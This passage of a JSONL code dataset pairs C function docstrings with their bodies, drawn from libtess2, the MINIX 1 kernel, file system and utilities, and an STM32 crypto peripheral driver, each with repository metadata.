);\n\t}\n\tassert(free != INV_HANDLE);\n\treturn free;\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really tessPqSortMinimum */\n", "func_signal": "PQkey pqMinimum( PriorityQ *pq )", "code": "{\n\tPQkey sortMin, heapMin;\n\n\tif( pq->size == 0 ) {\n\t\treturn pqHeapMinimum( pq->heap );\n\t}\n\tsortMin = *(pq->order[pq->size-1]);\n\tif( ! pqHeapIsEmpty( pq->heap )) {\n\t\theapMin = pqHeapMinimum( pq->heap );\n\t\tif( LEQ( heapMin, sortMin )) {\n\t\t\treturn heapMin;\n\t\t}\n\t}\n\treturn sortMin;\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* Splice( a, b ) is best described by the Guibas/Stolfi paper or the\n* CS348a notes (see mesh.h).  Basically it modifies the mesh so that\n* a->Onext and b->Onext are exchanged.  This can have various effects\n* depending on whether a and b belong to different face or vertex rings.\n* For more explanation see tessMeshSplice() below.\n*/\n", "func_signal": "static void Splice( TESShalfEdge *a, TESShalfEdge *b )", "code": "{\n\tTESShalfEdge *aOnext = a->Onext;\n\tTESShalfEdge *bOnext = b->Onext;\n\n\taOnext->Sym->Lnext = b;\n\tbOnext->Sym->Lnext = a;\n\ta->Onext = bOnext;\n\tb->Onext = aOnext;\n}", "path": "Source\\mesh.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/* really tessPqSortDelete */\n", "func_signal": "void pqDelete( PriorityQ *pq, PQhandle curr )", "code": "{\n\tif( curr >= 0 ) {\n\t\tpqHeapDelete( pq->heap, curr );\n\t\treturn;\n\t}\n\tcurr = -(curr+1);\n\tassert( curr < pq->max && pq->keys[curr] != NULL );\n\n\tpq->keys[curr] = NULL;\n\twhile( pq->size > 0 && *(pq->order[pq->size-1]) == NULL ) {\n\t\t-- pq->size;\n\t}\n}", "path": "Source\\priorityq.c", "repo_name": "memononen/libtess2", "stars": 410, "license": "other", "language": "c", "size": 186}
{"docstring": "/*===========================================================================*\n *\t\t\t\tdo_open\t\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC int do_open()", "code": "{\n/* Perform the open(name, mode) system call. */\n\n  register struct inode *rip;\n  struct filp *fil_ptr;\n  register int r;\n  register mask_bits bits;\n  int file_d;\n  extern struct inode *eat_path();\n\n  /* See if file descriptor and filp slots are available.  The variable\n   * 'mode' is 0 for read, 1 for write, 2 for read+write.  The variable\n   * 'bits' needs to be R_BIT, W_BIT, and R_BIT|W_BIT respectively.\n   */\n  if (mode < 0 || mode > 2) return(EINVAL);\n  if (fetch_name(name, name_length, M3) != OK) return(err_code);\n  bits = (mask_bits) mode_map[mode];\n  if ( (r = get_fd(bits, &file_d, &fil_ptr)) != OK) return(r);\n\n  /* Scan path name. */\n  if ( (rip = eat_path(user_path)) == NIL_INODE) return(err_code);\n\n  if ((r = forbidden(rip, bits, 0)) != OK) {\n\tput_inode(rip);          /* can't open: protection violation */\n\treturn(r);\n  }\n\n  /* Opening regular files, directories and special files are different. */\n  switch (rip->i_mode & I_TYPE) {\n     case I_DIRECTORY:\n\tif (bits & W_BIT) {\n\t\tput_inode(rip);\n\t\treturn(EISDIR);\n\t}\n\tbreak;\n\n     case I_CHAR_SPECIAL:\n\t/* Assume that first open of char special file is controlling tty. */\n\tif (fp->fs_tty == 0) fp->fs_tty = (dev_nr) rip->i_zone[0];\n\tdev_open((dev_nr) rip->i_zone[0], (int) bits);\n\tbreak;\n\n     case I_BLOCK_SPECIAL:\n\tdev_open((dev_nr) rip->i_zone[0], (int) bits);\n\tbreak;\n  }\n\n  /* Claim the file descriptor and filp slot and fill them in. */\n  fp->fp_filp[file_d] = fil_ptr;\n  fil_ptr->filp_count = 1;\n  fil_ptr->filp_ino = rip;\n  return(file_d);\n}", "path": "fs\\open.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\twinchester_task\t\t\t\t     * \n *===========================================================================*/\n", "func_signal": "PUBLIC winchester_task()", "code": "{\n/* Main program of the winchester disk driver task. */\n\n  int r, caller, proc_nr;\n\n  /* First initialize the controller */\n  init_param();\n\n  /* Here is the main loop of the disk task.  It waits for a message, carries\n   * it out, and sends a reply.\n   */\n\n  while (TRUE) {\n\t/* First wait for a request to read or write a disk block. */\n\treceive(ANY, &w_mess);\t/* get a request to do some work */\n\tif (w_mess.m_source < 0) {\n\t\tprintf(\"winchester task got message from %d \", w_mess.m_source);\n\t\tcontinue;\n\t}\n\tcaller = w_mess.m_source;\n\tproc_nr = w_mess.PROC_NR;\n\n\t/* Now carry out the work. */\n\tswitch(w_mess.m_type) {\n\t    case DISK_READ:\n\t    case DISK_WRITE:\tr = w_do_rdwt(&w_mess);\tbreak;\n\t    default:\t\tr = EINVAL;\t\tbreak;\n\t}\n\n\t/* Finally, prepare and send the reply message. */\n\tw_mess.m_type = TASK_REPLY;\t\n\tw_mess.REP_PROC_NR = proc_nr;\n\n\tw_mess.REP_STATUS = r;\t/* # of bytes transferred or error code */\n\tsend(caller, &w_mess);\t/* send reply to caller */\n  }\n}", "path": "kernel\\wini.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*============================================================================*\n *\t\t\t\tread_ecc\t\t\t\t      *\n *============================================================================*/\n", "func_signal": "PRIVATE read_ecc()", "code": "{\n/* Read the ecc burst-length and let the controller correct the data */\n\n  int r;\n\n  command[0] = WIN_ECC_READ;\n  if (com_out(NO_DMA_INT) == OK && hd_wait(1) == OK) {\n\tport_in(WIN_DATA, &r);\n\tif (hd_wait(1) == OK) {\n\t\tport_in(WIN_DATA, &r);\n\t\tif (r & 1)\n\t\t\tw_need_reset = TRUE;\n\t}\n  }\n  return(ERR);\n}", "path": "kernel\\wini.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\treset\t\t\t\t\t     * \n *===========================================================================*/\n", "func_signal": "PRIVATE reset()", "code": "{\n/* Issue a reset to the controller.  This is done after any catastrophe,\n * like the controller refusing to respond.\n */\n\n  int i, r, status;\n  register struct floppy *fp;\n  /* Disable interrupts and strobe reset bit low. */\n  need_reset = FALSE;\n  lock();\n  motor_status = 0;\n  motor_goal = 0;\n  port_out(DOR, 0);\t\t/* strobe reset bit low */\n  port_out(DOR, ENABLE_INT);\t/* strobe it high again */\n  unlock();\t\t\t/* interrupts allowed again */\n  receive(HARDWARE, &mess);\t/* collect the RESET interrupt */\n\n  /* Interrupt from the reset has been received.  Continue resetting. */\n  fp = &floppy[0];\t\t/* use floppy[0] for scratch */\n  fp->fl_results[0] = 0;\t/* this byte will be checked shortly */\n  fdc_out(FDC_SENSE);\t\t/* did it work? */\n  r = fdc_results(fp);\t\t/* get results */\n  status = fp->fl_results[0] & BYTE;\n\n  /* Tell FDC drive parameters. */\n  fdc_out(FDC_SPECIFY);\t\t/* specify some timing parameters */\n  fdc_out(SPEC1);\t\t/* step-rate and head-unload-time */\n  fdc_out(SPEC2);\t\t/* head-load-time and non-dma */\n\n  for (i = 0; i < NR_DRIVES; i++) floppy[i].fl_calibration = UNCALIBRATED;\n}", "path": "kernel\\floppy.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tdo_mknod\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC int do_mknod()", "code": "{\n/* Perform the mknod(name, mode, addr) system call. */\n\n  register mask_bits bits;\n\n  if (!super_user) return(EPERM);\t/* only super_user may make nodes */\n  if (fetch_name(name1, name1_length, M1) != OK) return(err_code);\n  bits = (mode & I_TYPE) | (mode  & ALL_MODES & fp->fp_umask);\n  put_inode(new_node(user_path, bits, (zone_nr) addr));\n  return(err_code);\n}", "path": "fs\\open.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\twin_init\t\t\t\t     * \n *===========================================================================*/\n", "func_signal": "PRIVATE win_init()", "code": "{\n/* Routine to initialize the drive parameters after boot or reset */\n\n  register int i;\n\n  command[0] = WIN_SPECIFY;\t\t/* Specify some parameters */\n  command[1] = 0;\t\t\t/* Drive 0 */\n  if (com_out(NO_DMA_INT) != OK)\t/* Output command block */\n\treturn(ERR);\n  lock();\n\n  /* No. of cylinders (high byte) */\n  win_out(param0.nr_cyl >> 8);\n\n  /* No. of cylinders (low byte) */\n  win_out(param0.nr_cyl & 0xFF);\n\n  /* No. of heads */\n  win_out(param0.nr_heads);\n\n  /* Start reduced write (high byte) */\n  win_out(param0.reduced_wr >> 8);\n\n  /* Start reduced write (low byte) */\n  win_out(param0.reduced_wr & 0xFF);\n\n  /* Start write precompensation (high byte) */\n  win_out(param0.wr_precomp >> 8);\n\n  /* Start write precompensation (low byte) */\n  win_out(param0.wr_precomp & 0xFF);\n\n  /* Ecc burst length */\n  win_out(param0.max_ecc);\n  unlock();\n\n  if (check_init() != OK) {\t/* See if controller accepted parameters */\n\tw_need_reset = TRUE;\n\treturn(ERR);\n  }\n\n  if (nr_drives > 1) {\n\tcommand[1] = (1 << 5);\t\t\t/* Drive 1 */\n\tif (com_out(NO_DMA_INT) != OK)\t\t/* Output command block */\n\t\treturn(ERR);\n\tlock();\n\n\t/* No. of cylinders (high byte) */\n\twin_out(param1.nr_cyl >> 8);\n\n\t/* No. of cylinders (low byte) */\n\twin_out(param1.nr_cyl & 0xFF);\n\n\t/* No. of heads */\n\twin_out(param1.nr_heads);\n\n\t/* Start reduced write (high byte) */\n\twin_out(param1.reduced_wr >> 8);\n\n\t/* Start reduced write (low byte) */\n\twin_out(param1.reduced_wr & 0xFF);\n\n\t/* Start write precompensation (high byte) */\n\twin_out(param1.wr_precomp >> 8);\n\n\t/* Start write precompensation (low byte) */\n\twin_out(param1.wr_precomp & 0xFF);\n\n\t/* Ecc burst length */\n\twin_out(param1.max_ecc);\n\tunlock();\n\tif (check_init() != OK) {  /* See if controller accepted parameters */\n\t\tw_need_reset = TRUE;\n\t\treturn(ERR);\n\t}\n  }\n  for (i=0; i<nr_drives; i++) {\n\tcommand[0] = WIN_RECALIBRATE;\n\tcommand[1] = i << 5;\n\tcommand[5] = CTRL_BYTE;\n\tif (com_out(INT) != OK)\n\t\treturn(ERR);\n\treceive(HARDWARE, &w_mess);\n\tif (win_results() != OK) {\n\t\tw_need_reset = TRUE;\n\t\treturn(ERR);\n\t}\n  }\n  return(OK);\n}", "path": "kernel\\wini.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tdo_close\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC int do_close()", "code": "{\n/* Perform the close(fd) system call. */\n\n  register struct filp *rfilp;\n  register struct inode *rip;\n  int rw;\n  int mode_word;\n  extern struct filp *get_filp();\n\n  /* First locate the inode that belongs to the file descriptor. */\n  if ( (rfilp = get_filp(fd)) == NIL_FILP) return(err_code);\n  rip = rfilp->filp_ino;\t/* 'rip' points to the inode */\n\n  /* Check to see if the file is special. */\n  mode_word = rip->i_mode & I_TYPE;\n  if (mode_word == I_CHAR_SPECIAL || mode_word == I_BLOCK_SPECIAL) {\n\tif (mode_word == I_BLOCK_SPECIAL)  {\n\t\t/* Invalidate cache entries unless special is mounted or ROOT.*/\n\t\tdo_sync();\t/* purge cache */\n\t\tif (mounted(rip) == FALSE) invalidate((dev_nr) rip->i_zone[0]);\n\t}\n\tdev_close((dev_nr) rip->i_zone[0]);\n  }\n\n  /* If the inode being closed is a pipe, release everyone hanging on it. */\n  if (rfilp->filp_ino->i_pipe) {\n\trw = (rfilp->filp_mode & R_BIT ? WRITE : READ);\n\trelease(rfilp->filp_ino, rw, NR_PROCS);\n  }\n\n  /* If a write has been done, the inode is already marked as DIRTY. */\n  if (--rfilp->filp_count == 0) put_inode(rfilp->filp_ino);\n\n  fp->fp_filp[fd] = NIL_FILP;\n  return(OK);\n}", "path": "fs\\open.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*============================================================================*\n *\t\t\t\tcheck_init\t\t\t\t      *\n *============================================================================*/\n", "func_signal": "PRIVATE check_init()", "code": "{\n/* Routine to check if controller accepted the parameters */\n  int r;\n\n  if (hd_wait(2) == OK) {\n\t  port_in(WIN_DATA, &r);\n\t  if (r & 2)\n\t\treturn(ERR);\n\t  else\n\t\treturn(OK);\n  }\n}", "path": "kernel\\wini.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tpr_char\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC pr_char()", "code": "{\n/* This is the interrupt handler.  When a character has been printed, an\n * interrupt occurs, and the assembly code routine trapped to calls pr_char().\n * One annoying problem is that the 8259A controller sometimes generates\n * spurious interrupts to vector 15, which is the printer vector.  Ignore them.\n */\n\n  int value, ch, i;\n  char c;\n  extern char get_byte();\n\n  if (pcount != orig_count) port_out(INT_CTL, ENABLE);\n  if (pr_busy == FALSE) return;\t/* spurious 8259A interrupt */\n\n  while (pcount > 0) {\n  \tport_in(port_base + 1, &value);\t/* get printer status */\n  \tif (value == NORMAL_STATUS) {\n\t\t/* Everything is all right.  Output another character. */\n\t\tc = get_byte(es, offset);\t/* fetch char from user buf */\n\t\tch = c & BYTE;\n\t\tport_out(port_base, ch);\t/* output character */\n\t\tport_out(port_base + 2, ASSERT_STROBE);\n\t\tport_out(port_base + 2, NEGATE_STROBE);\n\t\toffset++;\n\t\tpcount--;\n\t\tcum_count++;\t/* count characters output */\n\t\tfor (i = 0; i < DELAY_COUNT; i++) ;\t/* delay loop */\n\t} else if (value == BUSY_STATUS) {\n\t\t \treturn;\t\t/* printer is busy; wait for interrupt*/\n\t} else {\n\t\t \tbreak;\t\t/* err: send message to printer task */\n\t}\n  }\n  \n/* Count is 0 or an error occurred; send message to printer task. */\n  int_mess.m_type = TTY_O_DONE;\n  int_mess.REP_STATUS = (pcount == 0 ? OK : value);\n  interrupt(PRINTER, &int_mess);\n}", "path": "kernel\\printer.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tprinter_task\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC printer_task()", "code": "{\n/* Main routine of the printer task. */\n\n  message print_mess;\t\t/* buffer for all incoming messages */\n\n  print_init();\t\t\t/* initialize */\n\n  while (TRUE) {\n\treceive(ANY, &print_mess);\n\tswitch(print_mess.m_type) {\n\t    case TTY_WRITE:\tdo_write(&print_mess);\tbreak;\n\t    case CANCEL   :\tdo_cancel(&print_mess);\tbreak;\n\t    case TTY_O_DONE:\tdo_done(&print_mess);\tbreak;\n    \t    default:\t\t\t\t\tbreak;\n\t}\n  }\n}", "path": "kernel\\printer.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tprint_init\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PRIVATE print_init()", "code": "{\n/* Color display uses 0x378 for printer; mono display uses 0x3BC. */\n\n  int i;\n  extern int color;\n\n  port_base = (color ? PR_COLOR_BASE : PR_MONO_BASE);\n  pr_busy = FALSE;\n  port_out(port_base + 2, INIT_PRINTER);\n  for (i = 0; i < DELAY_COUNT; i++) ;\t/* delay loop */\n  port_out(port_base + 2, SELECT);\n}", "path": "kernel\\printer.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tdo_lseek\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC int do_lseek()", "code": "{\n/* Perform the lseek(ls_fd, offset, whence) system call. */\n\n  register struct filp *rfilp;\n  register file_pos pos;\n  extern struct filp *get_filp();\n\n  /* Check to see if the file descriptor is valid. */\n  if ( (rfilp = get_filp(ls_fd)) == NIL_FILP) return(err_code);\n\n  /* No lseek on pipes. */\n  if (rfilp->filp_ino->i_pipe == I_PIPE) return(ESPIPE);\n\n  /* The value of 'whence' determines the algorithm to use. */\n  switch(whence) {\n\tcase 0:\tpos = offset;\tbreak;\n\tcase 1: pos = rfilp->filp_pos + offset;\tbreak;\n\tcase 2: pos = rfilp->filp_ino->i_size + offset;\tbreak;\n\tdefault: return(EINVAL);\n  }\n  if (pos < (file_pos) 0) return(EINVAL);\n\n  rfilp->filp_ino->i_seek = ISEEK;\t/* inhibit read ahead */\n  rfilp->filp_pos = pos;\n\n  reply_l1 = pos;\t\t/* insert the long into the output message */\n  return(OK);\n}", "path": "fs\\open.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tsend_mess\t\t\t\t     * \n *===========================================================================*/\n", "func_signal": "PRIVATE send_mess()", "code": "{\n/* This routine is called when the clock task has timed out on motor startup.*/\n\n  mess.m_type = MOTOR_RUNNING;\n  send(FLOPPY, &mess);\n}", "path": "kernel\\floppy.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*============================================================================*\n *\t\t\t\tinit_params\t\t\t\t      *\n *============================================================================*/\n", "func_signal": "PRIVATE init_params()", "code": "{\n/* This routine is called at startup to initialize the partition table,\n * the number of drives and the controller\n*/\n  unsigned int i, segment, offset;\n  int type_0, type_1;\n  phys_bytes address;\n  extern phys_bytes umap();\n  extern int vec_table[];\n\n  /* Read the switches from the controller */\n  port_in(WIN_SELECT, &i);\n\n  /* Calculate the drive types */\n  type_0 = (i >> 2) & 3;\n  type_1 = i & 3;\n\n  /* Copy the parameter vector from the saved vector table */\n  offset = vec_table[2 * 0x41];\n  segment = vec_table[2 * 0x41 + 1];\n\n  /* Calculate the address off the parameters and copy them to buf */\n  address = ((long)segment << 4) + offset;\n  phys_copy(address, umap(proc_addr(WINCHESTER), D, buf, 64), 64L);\n\n  /* Copy the parameters to the structures */\n  copy_param((&buf[type_0 * 16]), &param0);\n  copy_param((&buf[type_1 * 16]), &param1);\n\n  /* Get the nummer of drives from the bios */\n  phys_copy(0x475L, umap(proc_addr(WINCHESTER), D, buf, 1), 1L);\n  nr_drives = (int) *buf;\n\n  /* Set the parameters in the drive structure */\n  for (i=0; i<5; i++)\n\twini[i].wn_heads = param0.nr_heads;\n  wini[0].wn_low = wini[5].wn_low = 0L;\n  wini[0].wn_size = (long)((long)param0.nr_cyl * (long)param0.nr_heads * (long)NR_SECTORS);\n  for (i=5; i<10; i++)\n\twini[i].wn_heads = param1.nr_heads;\n  wini[5].wn_size = (long)((long)param1.nr_cyl * (long)param1.nr_heads * (long)NR_SECTORS);\n\n\n  /* Initialize the controller */\n  if ((nr_drives > 0) && (win_init() != OK))\n\t\tnr_drives = 0;\n\n  /* Read the partition table for each drive and save them */\n  for (i = 0; i < nr_drives; i++) {\n\tw_mess.DEVICE = i * 5;\n\tw_mess.POSITION = 0L;\n\tw_mess.COUNT = BLOCK_SIZE;\n\tw_mess.ADDRESS = (char *) buf;\n\tw_mess.PROC_NR = WINCHESTER;\n\tw_mess.m_type = DISK_READ;\n\tif (w_do_rdwt(&w_mess) != BLOCK_SIZE)\n\t\tpanic(\"Can't read partition table of winchester \", i);\n\tcopy_prt(i * 5);\n  }\n}", "path": "kernel\\wini.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tdo_chown\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC int do_chown()", "code": "{\n/* Perform the chown(name, owner, group) system call. */\n\n  register struct inode *rip;\n  register int r;\n  extern struct inode *eat_path();\n\n  /* Only the super_user may perform the chown() call. */\n  if (!super_user) return(EPERM);\n\n  /* Temporarily open the file. */\n  if (fetch_name(name1, name1_length, M1) != OK) return(err_code);\n  if ( (rip = eat_path(user_path)) == NIL_INODE) return(err_code);\n\n  /* Not permitted to change the owner of a file on a read-only file sys. */\n  r = read_only(rip);\n  if (r == OK) {\n\trip->i_uid = owner;\n\trip->i_gid = group;\n\trip->i_dirt = DIRTY;\n  }\n\n  put_inode(rip);\n  return(r);\n}", "path": "fs\\protect.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*\n *\tbumpword - add word to current line.\n */\n", "func_signal": "bumpword()", "code": "{\n\tchar *hc;\n\t*holdp = '\\0';\n/*\n *\tWe use a while-loop in case of ridiculously long words with\n *\tmultiple hyphenation indicators.\n */\n\tif (assylen + reallen(holdword) > o_ll - IDTLEN) {\n\t\tif (!o_hy) writeline(o_ad,0);\n\t\telse while (assylen + reallen(holdword) > o_ll - IDTLEN) {\n/*\n *\tTry hyphenating it.\n */\n\t\t\tif (o_hc && strhas(holdword,o_hc)) {\n/*\n *\tThere are hyphenation marks.  Use them!\n */\n\t\t\t\tfor (hc=strend(holdword); hc>=holdword; hc--) {\n\t\t\t\t\tif (*hc!=o_hc) continue;\n\t\t\t\t\t*hc = '\\0';\n\t\t\t\t\tif (assylen + reallen(holdword) + 1 >\n\t\t\t\t\to_ll - IDTLEN) {\n\t\t\t\t\t\t*hc = o_hc;\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t}\n/*\n *\tYay - it fits!\n */\n\t\t\t\t\tdehyph(holdword);\n\t\t\t\t\tstrcpy(&assyline[assylen],holdword);\n\t\t\t\t\tstrcat(assyline,\"-\");\n\t\t\t\t\tassylen += strlen(holdword) + 1;\n\t\t\t\t\tstrcpy(holdword,++hc);\n\t\t\t\t\tbreak;\t/* STOP LOOKING */\n\t\t\t\t} /* for */\n/*\n *\tIt won't fit, or we've succeeded in breaking the word.\n */\n\t\t\t\twriteline(o_ad,0);\n\t\t\t\tif (hc<holdword) goto giveup;\n\t\t\t}\n\t\t\telse {\n/*\n *\tIf no hyphenation marks, give up.\n *\tLet somebody else implement it.\n */\n\t\t\t\twriteline(o_ad,0);\n\t\t\t\tgoto giveup;\n\t\t\t}\n\t\t} /* while */\n\t}\ngiveup:\n/*\n *\tremove hyphenation marks, even if hyphenation is disabled.\n */\n\tif (o_hc) dehyph(holdword);\n\tstrcpy(&assyline[assylen],holdword);\n\tassylen+=strlen(holdword);\n\tholdp = holdword;\n}", "path": "commands\\roff.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tdo_umask\t\t\t\t     *\n *===========================================================================*/\n", "func_signal": "PUBLIC int do_umask()", "code": "{\n/* Perform the umask(co_mode) system call. */\n  register mask_bits r;\n\n  r = ~fp->fp_umask;\t\t/* set 'r' to complement of old mask */\n  fp->fp_umask = ~(co_mode & RWX_MODES);\n  return(r);\t\t\t/* return complement of old mask */\n}", "path": "fs\\protect.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tstop_motor\t\t\t\t     * \n *===========================================================================*/\n", "func_signal": "PRIVATE stop_motor()", "code": "{\n/* This routine is called by the clock interrupt after several seconds have\n * elapsed with no floppy disk activity.  It checks to see if any drives are\n * supposed to be turned off, and if so, turns them off.\n */\n\n  if ( (motor_goal & MOTOR_MASK) != (motor_status & MOTOR_MASK) ) {\n\tport_out(DOR, motor_goal);\n\tmotor_status = motor_goal;\n  }\n}", "path": "kernel\\floppy.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*debugging*/\n/* print the dependencies and command lines... */\n", "func_signal": "prtree()", "code": "{\nstruct defnrec *dummy;\nstruct macrec  *mdum;\nstruct llist   *dum2,*dum3,*rdum2;\nstruct rulerec *rdum;\nint    cnt;\n\n    dummy = defnlist;\n    while (dummy != NULL){\n\tfprintf(stdout,\"name '%s'  exists: %s\\n\",\n\t\t    dummy->name,(dummy->modified)?\"no\":\"yes\");\n\t\t    \n\tdum2 = dummy->dependson;\n\tfprintf(stdout,\"   depends-on:\");\n\tcnt =0;\n\twhile (dum2 != NULL){\n\t    fprintf(stdout,\" %13s \",dum2->name);\n\t    cnt++;\n\t    if (cnt == 4){\n\t\tcnt = 0;\n\t\tfprintf(stdout,\"\\n              \");\n\t    }\n\t    dum2 = dum2->next;\n\t}\n\tfprintf(stdout,\"\\n\");\n\n\tdum3 = dummy->howto;\n\twhile (dum3 != NULL){\n\t    fprintf(stdout,\"      command: %s\\n\",dum3->name);\n\t    dum3 = dum3->next;\n\t}\n\tdummy = dummy->nextdefn;\n\tfprintf(stdout,\"\\n\");\n    }\n\n    fprintf(stdout,\"\\n       *RULES*\\n\\n\");\n    fprintf(stdout,\"src=     dest=     rule=\\n\");\n    rdum = rulelist;\n    while ( rdum != NULL ) {\n\tif ( rdum->rule == NULL )\n\t    fprintf(stdout,\"%4s     %4s      %s\\n\",\n\t\t    rdum->dep,rdum->targ,\"** Empty Rule **\");\n\telse {\n\t    fprintf(stdout,\"%4s     %4s      %s\\n\",\n\t            rdum->dep,rdum->targ,rdum->rule->name);\n\t    rdum2 = rdum->rule->next;\n\t    while ( rdum2 != NULL ) {\n\t\tfprintf(stdout,\"                   %s\\n\",rdum2->name);\n\t\trdum2 = rdum2->next;\n\t    }\n\t}\n\trdum = rdum->nextrule;\n    }\n\n    mdum = maclist;\n    if ( mdum == NULL ) \n        fprintf(stdout,\"\\n        *NO MACROS*\\n\");\n    else {\n\tfprintf(stdout,\"\\n        *MACROS*\\n\\n\");\n\tfprintf(stdout,\" macro          expansion\\n\");\n\twhile ( mdum != NULL ) {\n           fprintf(stdout,\" %8s       %s\\n\",mdum->name,mdum->mexpand);\n           mdum = mdum->nextmac;\n        }\n    }\n    fprintf(stdout,\"\\n\\nsuffix list is\");\n    if ( suff_head == NULL ) fprintf(stdout,\" empty.\");\n    else for ( dum2 = suff_head; dum2 != NULL; dum2 = dum2->next){\n\tfprintf(stdout,\" %s\",dum2->name);\n    }\n    fprintf(stdout,\"\\npath is \");\n    if (path_head == NULL) fprintf(stdout,\" empty.\");\n    else \n\t\tfor ( dum2 = path_head; dum2 != NULL; dum2 = dum2->next) \n\t         fprintf(stdout,\" %s:\",dum2->name);\n\n    fprintf(stdout,\"\\nswitch character  '%c'\\n\",switchc);\n    fprintf(stdout,\"line continuation '%c'\\n\",linecont);\n}", "path": "commands\\make.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/*===========================================================================*\n *\t\t\t\tw_reset\t\t\t\t\t     * \n *===========================================================================*/\n", "func_signal": "PRIVATE w_reset()", "code": "{\n/* Issue a reset to the controller.  This is done after any catastrophe,\n * like the controller refusing to respond.\n */\n\n  int r = 1, i;\n\n  /* Strobe reset bit low. */\n  port_out(WIN_STATUS, r);\n  for (i = 0; i < 10000; i++) {\n\tport_in(WIN_STATUS, &r);\n\tif ( (r&01) == 0)break;\n  }\n  if (r & 2) {\n\tprintf(\"Hard disk won't reset\\n\");\n\treturn(ERR);\n  }\n\n  /* Reset succeeded.  Tell WIN drive parameters. */\n  w_need_reset = FALSE;\n\n  return(win_init());\n}", "path": "kernel\\wini.c", "repo_name": "gdevic/minix1", "stars": 295, "license": "None", "language": "c", "size": 440}
{"docstring": "/**\n  * @brief  Fills each CRYP_KeyInitStruct member with its default value.\n  * @param  CRYP_KeyInitStruct: pointer to a CRYP_KeyInitTypeDef structure \n  *         which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void CRYP_KeyStructInit(CRYP_KeyInitTypeDef* CRYP_KeyInitStruct)", "code": "{\n  CRYP_KeyInitStruct->CRYP_Key0Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key0Right = 0;\n  CRYP_KeyInitStruct->CRYP_Key1Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key1Right = 0;\n  CRYP_KeyInitStruct->CRYP_Key2Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key2Right = 0;\n  CRYP_KeyInitStruct->CRYP_Key3Left  = 0;\n  CRYP_KeyInitStruct->CRYP_Key3Right = 0;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
{"docstring": "/**\n  * @brief  Fills each CRYP_IVInitStruct member with its default value.\n  * @param  CRYP_IVInitStruct: pointer to a CRYP_IVInitTypeDef Initialization \n  *         Vectors(IV) structure which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void CRYP_IVStructInit(CRYP_IVInitTypeDef* CRYP_IVInitStruct)", "code": "{\n  CRYP_IVInitStruct->CRYP_IV0Left  = 0;\n  CRYP_IVInitStruct->CRYP_IV0Right = 0;\n  CRYP_IVInitStruct->CRYP_IV1Left  = 0;\n  CRYP_IVInitStruct->CRYP_IV1Right = 0;\n}", "path": "starry_fmu\\Library\\STM_Lib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp.c", "repo_name": "JcZou/StarryPilot", "stars": 276, "license": "bsd-3-clause", "language": "c", "size": 107697}
